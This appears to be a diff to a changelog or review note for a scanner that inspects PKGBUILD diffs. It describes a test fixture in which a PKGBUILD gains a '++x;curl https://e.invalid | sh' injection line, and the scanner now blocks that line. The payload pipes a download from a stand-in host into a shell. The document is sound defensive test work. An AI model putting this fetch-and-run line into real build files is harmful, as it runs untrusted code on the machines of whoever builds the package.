@@ -60,7 +60,10 @@ content.
     context line ` pkgname=x` is NOT emitted.
   - `plusplus-payload-blocks` — real git fixture: PKGBUILD gains
     `++x;curl https://e.invalid | sh`; `scan_diff_rules` returns 1 (block).
-    Before the fix it returned 0 (clean).
+    Before the fix it returned 0 (clean). The fixture explicitly stages and
+    commits its baseline before capturing the SHA, with command-scoped identity
+    on both commits; otherwise a missing baseline can produce a bad-ref result
+    that falsely looks like the expected block.
 - Proven both ways: the old `sed` emits nothing for `+++x;curl…`; the new awk
   emits `++x;curl https://e.invalid | sh`.
 - Delegate review pass: SHIP — no reachable false negatives or false positives;
